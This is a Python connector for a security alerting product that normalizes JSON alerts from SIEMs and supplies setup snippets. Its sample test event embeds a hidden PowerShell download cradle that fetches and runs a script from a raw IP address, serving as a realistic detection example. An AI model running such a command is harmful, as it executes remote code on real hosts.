"""Generic webhook: any SIEM or tool that can POST an alert as JSON (Splunk, Elastic, Sentinel, QRadar, ...)."""
import hashlib
import json
import uuid
from datetime import datetime, timezone
from typing import Any, Dict, Optional, Sequence

from app.connectors.base import ConnectorField, NormalizedAlert, SiemConnector
from app.core import severity

# Where common tools put each value, tried in order when no path is configured
CANDIDATES = {
    "id": ("id", "alert_id", "event_id", "uuid", "_id", "sid", "result.sid", "kibana.alert.uuid"),
    "title": ("title", "name", "alert_name", "rule.name", "rule.description", "search_name", "signature",
              "kibana.alert.rule.name", "description", "message"),
    "severity": ("severity", "level", "priority", "urgency", "risk_score", "rule.severity", "event.severity",
                 "kibana.alert.severity", "result.severity", "result.urgency"),
    "host": ("host.name", "host", "hostname", "computer", "device", "agent.name", "source.ip", "src_ip", "src",
             "result.host", "result.src"),
    "timestamp": ("@timestamp", "timestamp", "time", "created_at", "event.created", "_time", "result._time"),
}

SCALES = (
    ("auto", "Automatic"),
    ("0-15", "0 to 15 (Wazuh style)"),
    ("0-10", "0 to 10"),
    ("0-100", "0 to 100 (risk score)"),
    ("1-5", "1 to 5, 5 is most severe"),
    ("1-5-inverted", "1 to 5, 1 is most severe"),
)

MISSING_SEVERITY_SCORE = 7  # medium: an alert a SIEM chose to send is presumed worth a look


def _get(data: Any, path: str) -> Any:
    """Value at a dotted path ('host.name'); a key containing dots is also accepted as is."""
    if isinstance(data, dict) and path in data:
        return data[path]
    current = data
    for part in path.split("."):
        if isinstance(current, dict) and part in current:
            current = current[part]
        elif isinstance(current, list) and part.isdigit() and int(part) < len(current):
            current = current[int(part)]
        else:
            return None
    return current


def _first(data: Dict[str, Any], configured: Optional[str], candidates: Sequence[str]) -> Any:
    paths = [configured.strip()] if configured and configured.strip() else list(candidates)
    for path in paths:
        value = _get(data, path)
        if value not in (None, "", [], {}):
            return value
    return None


def _score(value: Any, scale: str) -> int:
    if value is None:
        return MISSING_SEVERITY_SCORE
    if isinstance(value, str) and not value.strip().replace(".", "", 1).isdigit():
        word = severity.from_label(value)
        return word if word is not None else MISSING_SEVERITY_SCORE
    try:
        number = float(value)
    except (TypeError, ValueError):
        return MISSING_SEVERITY_SCORE
    if scale == "0-10":
        return severity.from_number(number, 10)
    if scale == "0-100":
        return severity.from_number(number, 100)
    if scale == "1-5":
        return severity.from_number(number - 1, 4)
    if scale == "1-5-inverted":
        return severity.from_number(5 - number, 4)
    if scale == "0-15":
        return severity.clamp(number)
    # auto: 0-15 for small numbers, risk-score style above that
    return severity.clamp(number) if number <= 15 else severity.from_number(number, 100)


def _timestamp(value: Any) -> datetime:
    ts = None
    if isinstance(value, (int, float)):
        # epoch seconds or milliseconds
        ts = datetime.fromtimestamp(value / 1000 if value > 1e11 else value, tz=timezone.utc)
    elif isinstance(value, str):
        text = value.strip()
        try:
            ts = datetime.fromisoformat(text.replace("Z", "+00:00"))
        except ValueError:
            try:
                number = float(text)
                ts = datetime.fromtimestamp(number / 1000 if number > 1e11 else number, tz=timezone.utc)
            except ValueError:
                ts = None
    if ts is None:
        ts = datetime.now(timezone.utc)
    return ts if ts.tzinfo else ts.replace(tzinfo=timezone.utc)


class GenericWebhookConnector(SiemConnector):
    id = "webhook"
    name = "Generic Webhook"
    description = ("Any SIEM or tool that can send an alert as JSON over HTTPS: Splunk, Elastic Security, "
                   "Microsoft Sentinel, IBM QRadar, Graylog and more.")
    logo = None
    fields = [
        ConnectorField("webhook_source_name", "Source name", placeholder="Splunk",
                       help="Shown on alerts from this source."),
        ConnectorField("webhook_severity_scale", "Severity scale", "select", default="auto", options=SCALES,
                       help="How the source expresses severity. Words such as High or Critical are always understood."),
        ConnectorField("webhook_id_field", "ID field", placeholder="automatic",
                       help="JSON path of the alert's unique id, e.g. result.sid. Leave empty to detect it."),
        ConnectorField("webhook_title_field", "Title field", placeholder="automatic", help="e.g. rule.name"),
        ConnectorField("webhook_severity_field", "Severity field", placeholder="automatic", help="e.g. kibana.alert.severity"),
        ConnectorField("webhook_host_field", "Host field", placeholder="automatic", help="e.g. host.name"),
        ConnectorField("webhook_timestamp_field", "Time field", placeholder="automatic", help="e.g. @timestamp"),
    ]

    def normalize(self, payload: Dict[str, Any], config: Dict[str, Any]) -> NormalizedAlert:
        if not isinstance(payload, dict):
            raise ValueError("The alert must be a JSON object")

        native_id = _first(payload, config.get("webhook_id_field"), CANDIDATES["id"])
        if native_id is None:
            # No id: derive a stable one so a re-sent alert is recognized as a duplicate
            canonical = json.dumps(payload, sort_keys=True, default=str).encode("utf-8")
            native_id = hashlib.sha256(canonical).hexdigest()[:24]

        title = _first(payload, config.get("webhook_title_field"), CANDIDATES["title"])
        host = _first(payload, config.get("webhook_host_field"), CANDIDATES["host"])
        if isinstance(host, dict):
            host = host.get("name") or host.get("hostname") or json.dumps(host)

        return NormalizedAlert(
            native_id=str(native_id),
            timestamp=_timestamp(_first(payload, config.get("webhook_timestamp_field"), CANDIDATES["timestamp"])),
            title=str(title)[:500] if title else "Alert from " + (config.get("webhook_source_name") or "webhook"),
            source=str(host) if host else (config.get("webhook_source_name") or "Unknown"),
            score=_score(_first(payload, config.get("webhook_severity_field"), CANDIDATES["severity"]),
                         config.get("webhook_severity_scale") or "auto"),
            raw=payload,
            fingerprint=str(native_id),
        )

    def sample_event(self) -> Dict[str, Any]:
        return {
            "id": f"test-{uuid.uuid4().hex[:12]}",
            "@timestamp": datetime.now(timezone.utc).isoformat().replace("+00:00", "Z"),
            "title": "Suspicious PowerShell download cradle (Nightshift test alert)",
            "severity": "high",
            "host": {"name": "WS-FIN-042", "ip": "10.20.4.42"},
            "user": {"name": "j.doe"},
            "process": {
                "name": "powershell.exe",
                "command_line": "powershell -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://45.137.21.9/a.ps1')\"",
            },
            "destination": {"ip": "45.137.21.9", "port": 80},
        }

    def setup_guide(self, ingest_url: str, token: str) -> Dict[str, Any]:
        return {
            "steps": [
                "In your SIEM, create an alert action or connector that sends an HTTP POST with the alert as JSON to the URL below.",
                "Authenticate it with the header  Authorization: Bearer <token>.",
                "Tools that cannot set headers (for example Splunk's built-in webhook action) can append ?token=<token> "
                "to the URL instead. Prefer the header where possible: URLs can end up in proxy logs.",
                "Send a test alert from the SIEM and check that it appears in Live Alerts. If title, host or severity are "
                "missing, set their JSON paths in this connector's settings.",
            ],
            "snippets": [
                {"title": "Test with curl", "language": "bash", "content": (
                    f"curl -X POST '{ingest_url}' \\\n"
                    f"  -H 'Authorization: Bearer {token}' \\\n"
                    "  -H 'Content-Type: application/json' \\\n"
                    "  -d '{\"id\": \"test-001\", \"title\": \"Test alert\", \"severity\": \"high\", \"host\": \"srv-01\"}'"
                )},
                {"title": "Splunk (webhook alert action URL)", "language": "text",
                 "content": f"{ingest_url}?token={token}"},
                {"title": "Elastic Security / Microsoft Sentinel (Logic App HTTP action)", "language": "text", "content": (
                    f"Method: POST\nURL: {ingest_url}\n"
                    f"Headers: Authorization: Bearer {token}\n         Content-Type: application/json\n"
                    "Body: the alert document (JSON)"
                )},
            ],
        }
